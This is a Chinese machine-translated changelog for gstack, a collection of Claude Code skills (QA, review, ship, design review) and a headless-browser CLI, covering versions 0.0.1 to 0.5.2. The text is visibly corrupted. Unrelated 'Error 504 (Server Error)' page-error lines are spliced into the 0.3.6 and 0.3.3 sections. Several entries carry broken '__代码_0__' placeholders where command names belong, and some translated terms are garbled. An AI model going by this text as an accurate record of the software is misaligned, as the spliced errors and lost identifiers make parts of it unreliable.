- 新测试：CEO审核模式验证（4种模式、持久性、晋升）、选择性扩展E2E测试。

## 0.5.2. 2026-03-17

- **您的设计顾问现在承担创造性风险。** `/design-consultation` 不仅仅提出了一个安全、连贯的系统。它明确地分解了安全选择（类别基线）与风险（您的产品脱颖而出）。您选择要打破的规则。每一个风险都伴随着其运作原理和成本的理由。
- **选择前查看情况。** 当您选择进行研究时，代理会通过屏幕截图和可访问性树分析来浏览您空间中的真实站点。不仅仅是网络搜索结果。在做出设计决策之前，您可以先了解现有的情况。
- **看起来像您的产品的预览页面。** 预览页面现在呈现真实的产品模型。带有侧边栏导航和数据表的仪表板、带有英雄部分的营销页面、带有表单的设置页面。不仅仅是字体样本和调色板。

## 0.5.1. 2026-03-17
- **在发货前了解您的立场。** 每个 `/plan-ceo-review`、`/plan-eng-review` 和 `/plan-design-review` 现在都会将其结果记录到评论跟踪器中。在每次审核结束时，您都会看到一个**审核准备情况仪表板**，显示哪些审核已完成、审核何时运行以及审核是否干净。具有明确的“已准许发货”或“未准备就绪”的判决。
- **`/ship` 在创建 PR 之前检查您的评论。** Pre-flight 现在会读取仪表板，并在缺少评论时询问您是否要继续。仅供参考。它不会阻止您，但您会知道您跳过了什么。
- **少了一件需要复制粘贴的事情。** SLUG 计算（用于从 git 远程计算 `owner-repo` 的不透明 sed 管道）现在是共享的 `bin/gstack-slug` 帮助程序。跨模板的所有 14 个内联副本均替换为 `source <(gstack-slug)`。如果格式发生变化，请修复一次。
- **屏幕截图现在在 QA 和浏览会话期间可见。** 当 gstack 截取屏幕截图时，它们现在在输出中显示为可单击的图像元素。不再有您看不到的不可见 `/tmp/browse-screenshot.png` 路径。适用于 `/qa`、`/qa-only`、`/plan-design-review`、`/qa-design-review`、`/browse` 和 `/gstack`。

### 对于贡献者

- 将 `{{REVIEW_DASHBOARD}}` 解析器添加到 `gen-skill-docs.ts`。共享仪表板阅读器注入 4 个模板（3 个审查技能 + 交付）。
- 添加了带有单元测试的 `bin/gstack-slug` 帮助程序（5 行 bash）。输出 `SLUG=` 和 `BRANCH=` 行，清理 `/` 到 `-`。
- 新 TODO：智能评论相关性检测 (P3)、评论门控 PR 合并的 `/merge` 技能 (P2)。

## 0.5.0. 2026-03-16

- **您的网站刚刚进行了设计审核。** `/plan-design-review` 打开您的网站并像高级产品设计师一样对其进行审核。排版、间距、层次结构、颜色、响应式、交互和 AI 溢出检测。获得每个类别的字母等级 (A-F)、双标题“设计得分”+“AI 坡度得分”，以及清晰的结构化第一印象。
- **它也可以修复它发现的内容。** `/qa-design-review` 运行相同的设计人员的眼睛审核，然后通过原子 `style(design):` 提交和 before/after 屏幕截图迭代修复源代码中的设计问题。默认情况下 CSS 安全，具有针对样式更改进行调整的更严格的自我调节启发式。
- **了解您的实际设计系统。** 这两种技能都可以通过 JS 提取您的实时网站的字体、颜色、标题比例和间距模式。然后提出将推断的系统保存为 `DESIGN.md` 基线。最后知道您实际使用了多少种字体。
- **AI Slop 检测是一个标题指标。** 每个报告都会打开两个分数：设计分数和 AI Slop 分数。 AI slop 检查表捕获了 10 种最容易识别的 AI 生成模式。 3 列功能网格、紫色渐变、装饰斑点、表情符号子弹、通用英雄副本。
- **设计回归跟踪。**报告写入 `design-baseline.json`。下次运行自动比较：每个类别的成绩增量、新发现、已解决的发现。观察您的设计分数随着时间的推移而提高。
- **80 项设计审核清单**，涵盖 10 个类别：视觉层次结构、版式、颜色/contrast、间距/layout、交互状态、响应式、运动、内容/microcopy、AI 倾斜和性能设计。从 Vercel 的 100 多个规则、Anthropic 的前端设计技能和其他 6 个设计框架中提炼出来。

### 对于贡献者

- 将 `{{DESIGN_METHODOLOGY}}` 解析器添加到 `gen-skill-docs.ts`。遵循 `{{QA_METHODOLOGY}}` 模式，将共享设计审核方法注入到 `/plan-design-review` 和 `/qa-design-review` 模板中。
- 添加了 `~/.gstack-dev/plans/` 作为远程视觉文档的本地计划目录（未签入）。 CLAUDE.md 和 TODOS.md 已更新。
- 将 `/setup-design-md` 添加到 TODOS.md (P2)，以便从头开始创建交互式 DESIGN.md。

## 0.4.5. 2026-03-16

- **审查结果现在实际上已得到修复，而不仅仅是列出。** `/review` 和 `/ship` 用于打印信息结果（死代码、测试间隙、N+1 查询），然后忽略它们。现在，每项发现都会得到落实：明显的机械修复会自动应用，真正不明确的问题会被批量处理成一个问题，而不是 8 个单独的提示。您会看到每个自动修复的 `[AUTO-FIXED] file:line Problem → what was done` 。
- **您可以控制“修复它”和“先问我”之间的界限。** 死代码、过时的注释、N+1 查询会自动修复。安全问题、竞争条件、设计决策都会在您的通话中浮出水面。分类位于一处 (`review/checklist.md`)，因此 `/review` 和 `/ship` 保持同步。

### 固定的

- **`$B js "const x = await fetch(...); return x.status"` 现在可以工作。** `js` 命令用于将所有内容包装为表达式。所以 `const`、分号和多行代码都被破坏了。它现在检测语句并使用块包装器，就像 `eval` 已经做的那样。
- **单击下拉选项不再永远挂起。** 如果代理在快照中看到 `@e3 [option] "Admin"` 并运行 `click @e3`，gstack 现在会自动选择该选项，而不是挂在不可能的 Playwright 单击上。正确的事情就会发生。
- **当 click 是错误的工具时，gstack 会告诉您。** 通过 CSS 选择器单击 `<option>` 常常会因神秘的 Playwright 错误而超时。现在你得到：`"Use 'browse select' instead of 'click' for dropdown options."`

### 对于贡献者

- 门分类 → 严重性分类重命名（严重性决定显示顺序，而不是您是否看到提示）。
- 修复优先启发式部分添加到 `review/checklist.md`。典型的 AUTO-FIX 与 ASK 分类。
- 新的验证测试：`Fix-First Heuristic exists in checklist and is referenced by review + ship`。
- 在 `read-commands.ts` 中提取 `needsBlockWrapper()` 和 `wrapForEvaluate()` 帮助程序。由 `js` 和 `eval` 命令共享 (DRY)。
- 将 `getRefRole()` 添加到 `BrowserManager`。公开 ref 选择器的 ARIA 角色，而不更改 `resolveRef` 返回类型。
- 单击处理程序通过父级 `<select>` 自动将 `[role=option]` 引用路由到 `selectOption()`，并使用 DOM `tagName` 检查以避免阻塞自定义列表框组件。
- 6项新测试：多行js、分号、语句关键字、简单表达式、选项自动路由、CSS选项错误引导。

## 0.4.4. 2026-03-16

- **在一小时内检测到新版本，而不是半天。**更新检查缓存设置为 12 小时，这意味着您可能会整天停留在旧版本上，而新版本会被删除。现在，“您已处于最新状态”将在 60 分钟后过期，因此您将在一小时内看到升级。 “可以升级”仍然会持续 12 个小时（这就是重点）。
- **`/gstack-upgrade` 始终检查真实性。** 现在直接运行 `/gstack-upgrade` 会绕过缓存并对 GitHub 进行全新检查。当您不在时，不再会出现“您已经是最新的”了。

### 对于贡献者

- 拆分 `last-update-check` 缓存 TTL：`UP_TO_DATE` 为 60 分钟，`UPGRADE_AVAILABLE` 为 720 分钟。
- 在 `bin/gstack-update-check` 中添加了 `--force` 标志（在检查之前删除缓存文件）。
- 3 个新测试：`--force` 破坏 UP_TO_DATE 缓存、`--force` 破坏 UPGRADE_AVAILABLE 缓存、使用 `utimesSync` 进行 60 分钟 TTL 边界测试。

## 0.4.3. 2026-03-16

- **新的 `/document-release` 技能。** 在 `/ship` 之后但合并之前运行它。它读取项目中的每个文档文件，交叉引用差异，并更新 README、ARCHITECTURE、CONTRIBUTING、CHANGELOG 和 TODOS 以匹配您实际发布的内容。危险的变化会以问题的形式出现；其他一切都是自动的。
- **现在，每个问题每次都非常清晰。** 您过去需要运行 3 个以上的会话，gstack 才会为您提供完整的上下文和简单的英语解释。现在每个问题。即使在单个会话中。告诉您项目、分支以及正在发生的事情，解释得足够简单，足以理解中间上下文切换。不再需要“抱歉，请简单地向我解释一下”。
- **分支名称始终正确。** gstack 现在会在运行时检测您当前的分支，而不是依赖于对话开始时的快照。在会话中切换分支？ gstack 跟上。

### 对于贡献者

- 将 ELI16 规则合并为基本 AskUserQuestion 格式。一种格式而不是两种，没有 `_SESSIONS >= 3` 条件。
- 在前导码 bash 块中添加了 `_BRANCH` 检测（带有后备的 `git branch --show-current`）。
- 添加了用于分支检测和简化规则的回归防护测试。

## 0.4.2. 2026-03-16

- **`$B js "await fetch(...)"` 现在可以正常工作。** `$B js` 或 `$B eval` 中的任何 `await` 表达式都会自动包装在异步上下文中。不再有 `SyntaxError: await is only valid in async functions`。单行eval文件直接返回值；多行文件使用显式 `return`。
- **贡献者模式现在可以反映，而不仅仅是做出反应。** 贡献者模式现在会提示定期反思，而不是只在出现问题时提交报告：“对您的 gstack 体验进行 0-10 的评分。而不是 10？想想为什么。”发现被动检测漏掉的生活质量问题和摩擦。报告现在包括 0-10 评级和“什么会使其成为 10”，以重点关注可操作的改进。
- **技能现在尊重您的分支目标。** `/ship`、`/review`、`/qa` 和 `/plan-ceo-review` 检测您的 PR 实际目标的分支，而不是假设 `main`。堆叠分支、针对功能分支的 Conductor 工作区以及使用 `master` 的存储库现在都可以正常工作。
- **`/retro` 适用于任何默认分支。** 使用 `master`、`develop` 或其他默认分支名称的存储库会自动检测。不再有空的复古，因为分支名称是错误的。
- **针对技能作者的新 `{{BASE_BRANCH_DETECT}}` 占位符**。将其放入任何模板中，即可免费获得 3 步分支检测（PR 基础 → 存储库默认 → 后备）。
- **3 个新的 E2E 烟雾测试** 验证基础分支检测在船舶、审查和复古技能中端到端的工作情况。

### 对于贡献者

- 添加了带有注释剥离功能的 `hasAwait()` 帮助程序，以避免 eval 文件中的 `// await` 出现误报。
- 智能评估换行：单行 → 表达式 `(...)`，多行 → 带有显式 `return` 的块 `{...}`。
- 6 个新的异步包装单元测试，40 个新的贡献者模式前导码验证测试。
- 校准示例被视为历史（“曾经失败”），以避免暗示存在实时错误修复后。
- 在 CLAUDE.md 中添加了“编写技能模板”部分。 bash-ism 上的自然语言规则、动态分支检测、独立代码块。
- 硬编码主回归测试扫描所有 `.tmpl` 文件以查找带有硬编码 `main` 的 git 命令。
- 清理了 QA 模板：删除了 `REPORT_DIR` shell 变量，将端口检测简化为散文。
- gstack-upgrade 模板：用于 bash 块之间变量引用的显式跨步骤散文。

## 0.4.1. 2026-03-16

- **gstack 现在会在出现问题时注意到。** 打开贡献者模式 (`gstack-config set gstack_contributor true`)，gstack 会自动记录出现的问题。你在做什么，出了什么问题，重现步骤。下次有什么事情让你烦恼时，错误报告已经写好了。 Fork gstack 并自行修复。
- **兼顾多个会话？ gstack 跟上。** 当您打开 3 个以上的 gstack 窗口时，现在每个问题都会告诉您哪个项目、哪个分支以及您正在做什么。不再盯着一个问题思考“等等，这是哪个窗口？”
- **现在每个问题都带有建议。** gstack 不会向您倾倒选项并让您思考，而是会告诉您它将选择什么以及为什么。每项技能都具有相同的清晰格式。
- **/review 现在捕获被遗忘的枚举处理程序。** 添加新的状态、层或类型常量？ /review 通过代码库中的每个 switch 语句、白名单和过滤器来跟踪它。不仅仅是您更改的文件。在发货前捕获“增加了价值但忘记处理它”类的错误。

### 对于贡献者

- 将所有 11 个技能模板的 `{{UPDATE_CHECK}}` 重命名为 `{{PREAMBLE}}`。现在，一个启动块可以处理更新检查、会话跟踪、贡献者模式和问题格式设置。
- 干燥 plan-ceo-review 和 plan-eng-review 问题格式以引用序言基线，而不是重复规则。
- 向 CLAUDE.md 添加了 CHANGELOG 样式指南和供应商符号链接感知文档。

## 0.4.0. 2026-03-16

### 额外
- **仅限 QA 技能** (`/qa-only`)。仅报告 QA 模式，可发现并记录错误而不进行修复。将干净的错误报告交给您的团队，而无需代理接触您的代码。
- **QA 修复循环**。 `/qa` 现在运行查找-修复-验证循环：发现错误、修复它们、提交、重新导航以确认修复已完成。从破损到发货的一个命令。
- **计划到 QA 工件流程**。 `/plan-eng-review` 写入 `/qa` 自动拾取的测试计划工件。您的工程审查现在可以直接输入到 QA 测试中，无需手动复制粘贴。
- **`{{QA_METHODOLOGY}}` DRY 占位符**。共享 QA 方法块已注入 `/qa` 和 `/qa-only` 模板中。当您更新测试标准时，保持两种技能同步。
- **评估效率指标**。现在，所有评估界面上都会显示轮次、持续时间和成本，并带有自然语言**要点**评论。一目了然地查看您的提示更改是否使代理变得更快或更慢。
- **`generateCommentary()` 引擎**。解释比较增量，因此您不必：标记回归、记录改进并生成总体效率摘要。
- **评估列表列**。 `bun run eval:list` 现在显示每次跑步的回合数和持续时间。立即发现昂贵或缓慢的运行情况。
- **评估每次测试效率的摘要**。 `bun run eval:summary` 显示每次运行测试的平均匝数/duration/cost。确定哪些测试随着时间的推移使您花费最多。
- **`judgePassed()` 单元测试**。提取并测试了pass/fail判断逻辑。
- **3 个新的 E2E 测试**。仅质量保证无修复护栏，带有提交验证的质量保证修复循环，计划工程审查测试计划工件。
- **浏览器引用过时检测**。 `resolveRef()` 现在检查元素计数以检测页面突变后的过时引用。 SPA 导航不再因缺少元素而导致 30 秒超时。
- 3 个新的快照测试来判断参考是否过时。

### 改变了
- QA 技能提示通过明确的两周期工作流程进行了重组（查找 → 修复 → 验证）。
- `formatComparison()` 现在显示每次测试的轮次和持续时间增量以及成本。
- `printSummary()` 显示回合数和持续时间列。
- `eval-store.test.ts` 修复了预先存在的 `_partial` 文件断言错误。

### 固定的
- 浏览器引用过时。现在可以检测并重新收集在页面突变（例如 SPA 导航）之前收集的引用。消除动态站点上的一类不稳定的 QA 失败。

## 0.3.9. 2026-03-15

### 额外
- **`bin/gstack-config` CLI**。 `~/.gstack/config.yaml` 的简单 get/set/list 接口。由更新检查和升级技能用于持久设置（auto_upgrade、update_check）。
- **智能更新检查**。 12 小时缓存 TTL（为 24 小时），当用户拒绝升级时指数暂停退避（24 小时 → 48 小时 → 1 周），`update_check: false` 配置选项可完全禁用检查。当新版本发布时，暂停会重置。
- **自动升级模式**。在配置中设置 `auto_upgrade: true` 或 `GSTACK_AUTO_UPGRADE=1` env var 以跳过升级提示并自动更新。
- **4 选项升级提示**。 “是的，立即升级”、“始终让我了解最新情况”、“现在不行”（暂停）、“不再询问”（禁用）。
- **供应的副本同步**。 `/gstack-upgrade` 现在会在升级主安装后检测并更新当前项目中的本地供应副本。
- 25 个新测试：11 个用于 gstack-config CLI，14 个用于更新检查中的 snooze/config 路径。

### 改变了
- 自述文件升级/troubleshooting部分简化为引用`/gstack-upgrade`而不是长粘贴命令。
- 升级技能模板至 v1.1.0，具有 `Write` 工具权限用于配置编辑。
- 所有 SKILL.md 序言均更新为新的升级流程描述。

## 0.3.8. 2026-03-14

### 额外
- **TODOS.md 作为单一事实来源**。将 `TODO.md` （路线图）和 `TODOS.md` （近期）合并到一个由 Skill/component 组织的文件中，并具有 P0-P4 优先级排序和已完成部分。
- **`/ship` 步骤 5.5：TODOS.md 管理**。自动检测差异中已完成的项目，使用版本注释标记它们已完成，如果丢失或非结构化，则提供创建/reorganize TODOS.md。
- **跨技能 TODOS 意识**。 `/plan-ceo-review`、`/plan-eng-review`、`/retro`、`/review` 和 `/qa` 现在读取 TODOS.md 以获取项目上下文。 `/retro` 添加了待办事项运行状况指标（未完成计数、P0/P1 项目、流失）。
- **共享 `review/TODOS-format.md`**。 `/ship` 和 `/plan-ceo-review` 引用的规范 TODO 项格式以防止格式漂移 (DRY)。
- **Greptile 2 层回复系统**。第 1 层（友好、内联差异 + 解释）用于第一响应；当 Greptile 在先前答复后重新标记时，第 2 层（坚定、完整的证据链 + 重新排名请求）。
- **Greptile 回复模板**。 `greptile-triage.md` 中的结构化模板用于修复（内联差异）、已修复（已完成的操作）和误报（证据 + 建议重新排名）。取代含糊的一行回复。
- **Greptile 升级检测**。显式算法来检测之前的 GStack 对注释线程的回复并自动升级到第 2 层。
- **Greptile 严重性重新排名**。当 Greptile 对问题严重性进行错误分类时，回复现在包括 `**Suggested re-rank:**`。
- 跨技能的 `TODOS-format.md` 引用的静态验证测试。

### 固定的
- **`.gitignore` 追加失败默默被吞掉**。 `ensureStateDir()` 裸 `catch {}` 替换为 ENOENT-only 静音；非 ENOENT 错误（EACCES、ENOSPC）记录到 `.gstack/browse-server.log`。

### 改变了
- `TODO.md` 已删除。所有项目合并到 `TODOS.md` 中。
- `/ship` 步骤 3.75 和 `/review` 步骤 5 现在引用来自 `greptile-triage.md` 的回复模板和升级检测。
- `/ship` 第 6 步提交顺序包括最终提交中的 TODOS.md 以及版本 + 更改日志。
- `/ship` 步骤 8 PR 正文包括 TODOS 部分。

## 0.3.7. 2026-03-14

### 额外
- **屏幕截图元素/region剪辑**。 `screenshot` 命令现在支持通过 CSS 选择器或 @ref (`screenshot "#hero" out.png`、`screenshot @e3 out.png`)、区域剪辑 (`screenshot --clip x,y,w,h out.png`) 和仅视口模式 (`screenshot --viewport out.png`) 进行元素裁剪。使用 Playwright 的原生 `locator.screenshot()` 和 `page.screenshot({ clip })`。整页仍为默认设置。
- 10 个新测试，涵盖所有屏幕截图模式（视口、CSS、@ref、剪辑）和错误路径（未知标志、互斥、无效坐标、路径验证、不存在的选择器）。

## 0.3.6. 2026-03-14

### 额外
- **端到端可观测性**。心跳文件 (`~/.gstack-dev/e2e-live.json`)、每次运行日志目录 (`~/.gstack-dev/e2e-runs/{runId}/`)、progress.log、每次测试 NDJSON 记录、持久故障记录。所有 I/O 非致命。
- **__代码_0__**。实时终端仪表板每 1 秒读取一次心跳 + 部分评估文件。显示已完成的测试、带有turn/tool信息的当前测试、过时检测（>10分钟）、progress.log的`--tail`。
- **增量评估保存**。每次测试完成后，`savePartial()` 写入 `_partial-e2e.json`。抗崩溃性：部分结果在被终止的运行中幸存下来。从来没有清理过。
- **机器可读的诊断**。 eval JSON 中的 `exit_reason`、`timeout_at_turn`、`last_tool_call` 字段。启用自动修复循环的 `jq` 查询。
Error 504 (Server Error)!!1504.That’s an error.There was an error. Please try again later.That’s all we know.
- **`is_error` 检测**。当 API 失败时，`claude -p` 可以返回 `subtype: "success"` 和 `is_error: true`。现在正确分类为 `error_api`。
- **Stream-json NDJSON 解析器**。 `parseNDJSON()` 纯函数，用于来自 `claude -p --output-format stream-json --verbose` 的实时 E2E 进度。
- **评估持久性**。结果保存到 `~/.gstack-dev/evals/` 并与之前的运行进行自动比较。
- **评估 CLI 工具**。 `eval:list`、`eval:compare`、`eval:summary` 用于检查评估历史记录。
- **所有 9 项技能均转换为 `.tmpl` 模板**。 plan-ceo-review、plan-eng-review、retro、review、ship 现在使用 `{{UPDATE_CHECK}}` 占位符。更新检查前导码的单一事实来源。
Error 504 (Server Error)!!1504.That’s an error.There was an error. Please try again later.That’s all we know.
Error 504 (Server Error)!!1504.That’s an error.There was an error. Please try again later.That’s all we know.
- 15 个可观察性单元测试，涵盖心跳模式、progress.log 格式、NDJSON 命名、savePartial、finalize、观察者渲染、过时检测、非致命 I/O。
- 针对计划首席执行官审查、计划工程审查、复古技能的 E2E 测试。
Error 504 (Server Error)!!1504.That’s an error.There was an error. Please try again later.That’s all we know.
- __代码_0__。 `getRemoteSlug()` 用于 git 远程检测。

### 固定的
- **Browse binary discovery broken for agents**.在 SKILL.md 设置块中将 `find-browse` 间接替换为显式 `browse/dist/browse` 路径。
- **更新检查退出代码 1 误导代理**。添加了`||true` 以防止在没有可用更新时出现非零退出。
Error 504 (Server Error)!!1504.That’s an error.There was an error. Please try again later.That’s all we know.
- **计划首席执行官审查超时**。在测试目录中初始化 git repo，跳过代码库探索，将超时设置为 420 秒。
- 植入错误评估可靠性。简化提示、降低检测基线、适应 max_turns 碎片。

### 改变了
- **模板系统扩展**。 `gen-skill-docs.ts` 中的 `{{UPDATE_CHECK}}` 和 `{{BROWSE_SETUP}}` 占位符。所有浏览使用技能均来自单一事实来源。
- 丰富了 14 个命令描述，包括特定的参数格式、有效值、错误行为和返回类型。
- 安装块首先检查工作区本地路径（用于开发），然后回退到全局安装。
- LLM评估法官从Haiku升级到Sonnet 4.6。
- `generateHelpText()` 从 COMMAND_DESCRIPTIONS 自动生成（替换手动维护的帮助文本）。

## 0.3.3. 2026-03-13

### 额外
- **SKILL.md 模板系统**。带有 `{{COMMAND_REFERENCE}}` 和 `{{SNAPSHOT_FLAGS}}` 占位符的 `.tmpl` 文件，在构建时从源代码自动生成。从结构上防止文档和代码之间的命令漂移。
- **命令注册表** (`browse/src/commands.ts`)。所有浏览命令的单一事实来源，具有类别和丰富的描述。零副作用，可以安全地从构建脚本和测试中导入。
- **快照标志元数据**（`browse/src/snapshot.ts` 中的 `SNAPSHOT_FLAGS` 数组）。元数据驱动的解析器取代了手工编码的 switch/case。在一处添加标志会更新解析器、文档和测试。
Error 504 (Server Error)!!1504.That’s an error.There was an error. Please try again later.That’s all we know.
- **通过 Agent SDK 进行第 2 层 E2E 测试**。产生真正的克劳德会话，运行技能，扫描浏览错误。由 `SKILL_E2E=1` 环境变量 (~$0.50/run) 控制
- **第 3 级法学硕士法官评估**。 Haiku 分数生成关于清晰度的文档/completeness/actionability（阈值≥4/5），加上回归测试与手动维护的基线。由 `ANTHROPIC_API_KEY` 控制
- **__代码_0__**。健康仪表板显示所有技能、命令计数、验证状态、模板新鲜度
- **__代码_0__**。监视模式在每次模板或源文件更改时重新生成并验证 SKILL.md
- **CI 工作流程** (`.github/workflows/skill-docs.yml`)。在 Push/PR 上运行 `gen:skill-docs`，如果生成的输出与提交的文件不同则失败
- 用于手动重新生成的 `bun run gen:skill-docs` 脚本
- `bun run test:eval` 用于法学硕士法官评估
- __代码_0__。从 Markdown 中提取并验证 `$B` 命令
- __代码_0__。具有错误模式扫描和记录保存功能的代理 SDK 包装器
- **架构.md**。设计决策文件涵盖守护程序模型、安全性、参考系统、日志记录、崩溃恢复
- **导体集成** (`conductor.json`)。用于工作区设置的生命周期挂钩/teardown
- **`.env` 传播**。 `bin/dev-setup` 自动将 `.env` 从主工作树复制到 Conductor 工作区
- 用于 API 密钥配置的 `.env.example` 模板

### 改变了
- 构建现在在编译二进制文件之前运行 `gen:skill-docs`
- `parseSnapshotArgs` 是元数据驱动的（迭代 `SNAPSHOT_FLAGS` 而不是 switch/case）
- `server.ts` 从 `commands.ts` 导入命令集，而不是声明内联
- SKILL.md 和 browser/SKILL.md 现在是生成的文件（改为编辑 `.tmpl`）

## 0.3.2. 2026-03-13

### 固定的
- Cookie 导入选择器现在返回 JSON 而不是 HTML。 `jsonResponse()` 引用了 `url` 超出范围，导致每个 API 调用崩溃
- `help` 命令路由正确（由于 META_COMMANDS 调度顺序而无法访问）
- 全局安装中的陈旧服务器不再影响本地更改。从 `resolveServerScript()` 中删除了遗留的 `~/.claude/skills/gstack` 回退
- 崩溃日志路径引用从 `/tmp/` 更新为 `.gstack/`

### 额外
- **差异感知 QA 模式**。功能分支上的 `/qa` 自动分析 `git diff`，识别受影响的页面/routes，检测本地主机上正在运行的应用程序，并仅测试更改的内容。无需网址。
- **项目本地浏览状态**。状态文件、日志和所有服务器状态现在位于项目根目录内的 `.gstack/` 中（通过 `git rev-parse --show-toplevel` 检测到）。不再有 `/tmp` 状态文件。
- **共享配置模块** (`browse/src/config.ts`)。集中 CLI 和服务器的路径解析，消除重复的 port/state 逻辑
- **随机端口选择**。服务器选择随机端口 10000-60000，而不是扫描 9400-9409。不再有 CONDUCTOR_PORT 魔法偏移。工作区之间不再发生端口冲突。
- **二进制版本跟踪**。状态文件包含 `binaryVersion` SHA；重建二进制文件时 CLI 自动重新启动服务器
- **旧版 /tmp 清理**。 CLI 扫描并删除旧的 `/tmp/browse-server*.json` 文件，在发送信号之前验证 PID 所有权
- **Greptile 集成**。 `/review` 和 `/ship` 获取并分类 Greptile 机器人评论； `/retro` 跟踪 Greptile 几周内的击球平均值
- **本地开发模式**。 `bin/dev-setup` 符号链接来自存储库的技能以进行就地开发； `bin/dev-teardown` 恢复全局安装
- `help` 命令。代理可以自我发现所有命令和快照标志
- 具有 META 信号协议的版本感知 `find-browse`。检测过时的二进制文件并提示代理更新
- `browse/dist/find-browse` 使用 git SHA 与 origin/main 进行比较编译的二进制文件（4 小时缓存）
- `.version` 在构建时编写的文件，用于二进制版本跟踪
- cookie 选择器的路由级别测试（13 次测试）和查找浏览版本检查（10 次测试）
- 配置解析测试（14 个测试），涵盖 git root 检测、BROWSE_STATE_FILE 覆盖、ensureStateDir、readVersionHash、resolveServerScript 和版本不匹配检测
- CLAUDE.md 中的浏览器交互指南。阻止 Claude 使用 mcp\_\_claude-in-chrome\_\_\* 工具
- CONTRIBUTING.md 包含快速入门、开发模式解释以及在其他存储库中测试分支的说明

### 改变了
- 状态文件位置：`.gstack/browse.json`（原为 `/tmp/browse-server.json`）
- 日志文件位置：`.gstack/browse-{console,network,dialog}.log`（原为 `/tmp/browse-*.log`）
- 原子状态文件写入：`.json.tmp` → 重命名（防止部分读取）
- CLI 将 `BROWSE_STATE_FILE` 传递给生成的服务器（服务器从中派生所有路径）
- SKILL.md 设置检查解析 META 信号并处理 `META:UPDATE_AVAILABLE`
- `/qa` SKILL.md 现在描述了四种模式（差异感知、完整、快速、回归），其中差异感知作为功能分支上的默认模式
- `jsonResponse`/`errorResponse` 使用选项对象来防止位置参数混淆
- 构建脚本编译 `browse` 和 `find-browse` 二进制文件，清理 `.bun-build` 临时文件
- README 更新了 Greptile 设置说明、差异感知 QA 示例和修订的演示记录

### 已删除
- `CONDUCTOR_PORT` 魔法偏移量 (`browse_port = CONDUCTOR_PORT - 45600`)
- 端口扫描范围9400-9409
- 旧版回退到 `~/.claude/skills/gstack/browse/src/server.ts`
- `DEVELOPING_GSTACK.md`（重命名为 CONTRIBUTING.md）

## 0.3.1. 2026-03-12

### 阶段 3.5：浏览器 cookie 导入

- `cookie-import-browser` 命令。从真正的 Chromium 浏览器（Comet、Chrome、Arc、Brave、Edge）解密并导入 cookie
- 从浏览服务器提供的交互式 cookie 选择器 Web UI（深色主题、两面板布局、域搜索、导入/remove）
- 带有 `--domain` 标志的直接 CLI 导入用于非交互式使用
- `/setup-browser-cookies` 克劳德代码集成技能
- macOS 钥匙串访问，异步 10 秒超时（无事件循环阻塞）
- 每个浏览器 AES 密钥缓存（每个浏览器每个会话一个钥匙串提示）
- DB 锁定回退：将锁定的 cookie DB 复制到 /tmp 以进行安全读取
- 18 个带有加密 cookie 装置的单元测试

## 0.3.0. 2026-03-12

### 第 3 阶段：/qa 技能。系统的质量保证测试

- 具有 6 阶段工作流程的新 `/qa` 技能（初始化、身份验证、定向、探索、记录、总结）
- 三种模式：完整（系统性，5-10 个问题）、快速（30 秒冒烟测试）、回归（与基线比较）
- 问题分类：7 个类别、4 个严重级别、每页探索清单
- 包含健康评分的结构化报告模板（0-100，按 7 个类别加权）
- Next.js、Rails、WordPress 和 SPA 的框架检测指南
- __代码_0__。使用 `git rev-parse --show-toplevel` 进行 DRY 二进制发现

### 第 2 阶段：增强浏览器

- 对话框处理：自动接受/dismiss、对话框缓冲区、提示文本支持
- 文件上传：`upload <sel> <file1> [file2...]`
- 元素状态检查：`可见|隐|已启用|残疾人|检查过|可编辑的|聚焦<sel>`
- 带注释的屏幕截图，上面覆盖有参考标签 (`snapshot -a`)
- 快照与先前快照的差异 (`snapshot -D`)
- 非 ARIA 可点击项的光标交互式元素扫描 (`snapshot -C`)
- `wait --networkidle` / `--load` / `--domcontentloaded` 标志
- `console --errors` 过滤器（仅错误+警告）
- `cookie-import <json-file>` 从页面 URL 自动填充域
- CircularBuffer O(1) 环形缓冲区，用于 console/network/dialog 缓冲区
- 使用 Bun.write() 进行异步缓冲区刷新
- 使用 page.evaluate + 2s 超时进行健康检查
- 剧作家错误包装。人工智能代理的可操作消息
- 上下文重新创建保留cookie/storage/URLs（用户代理修复）
- SKILL.md 重写为面向 QA 的剧本，包含 10 种工作流程模式
- 166 次集成测试（约为 63 次）

## 0.0.2. 2026-03-12

- 修复项目本地 `/browse` 安装。已编译的二进制文件现在从其自己的目录解析 `server.ts` 而不是假设存在全局安装
- `setup` 重建过时的二进制文件（不仅仅是丢失的二进制文件）并在构建失败时以非零值退出
- 修复 `chain` 命令吞噬写入命令中的实际错误（例如，导航超时报告为“未知元命令”）
- 修复当服务器在同一命令上重复崩溃时 CLI 中的无限重启循环
- 将 console/network 缓冲区限制为 50k 条目（环形缓冲区），而不是无限增长
- 修复缓冲区达到 50k 上限后磁盘刷新静默停止的问题
- 修复设置中的 `ln -snf` 以避免在升级时创建嵌套符号链接
- 使用 `git fetch && git reset --hard` 而不是 `git pull` 进行升级（处理强制推送）
- 简化安装：全局优先，带有可选的项目副本（替换子模块方法）
- 重组自述文件：英雄，之前/after，演示记录，故障排除部分
- 六项技能（添加`/retro`）

## 0.0.1. 2026-03-11

初次发布。

- 五种技能：`/plan-ceo-review`、`/plan-eng-review`、`/review`、`/ship`、`/browse`
- 无头浏览器 CLI，具有 40 多个命令、基于引用的交互、持久的 Chromium 守护进程
- 一命令安装为克劳德代码技能（子模块或全局克隆）
- 用于二进制编译和技能符号链接的 `setup` 脚本
